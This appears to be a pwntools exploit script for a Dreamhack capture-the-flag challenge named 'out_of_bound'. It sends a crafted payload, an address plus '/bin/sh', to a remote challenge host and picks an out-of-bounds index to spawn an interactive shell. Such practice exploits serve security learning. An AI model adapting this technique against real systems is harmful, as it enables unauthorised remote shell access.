from pwn import *

exe = ELF('out_of_bound', checksec=False)
#r = process(exe.path)
r = remote('host2.dreamhack.games', 18239)

payload = p32(0x804a0b0)
payload += b'/bin/sh\x00'
r.sendafter(b'name: ', payload)
r.sendlineafter(b'want?: ', b'19')
r.interactive()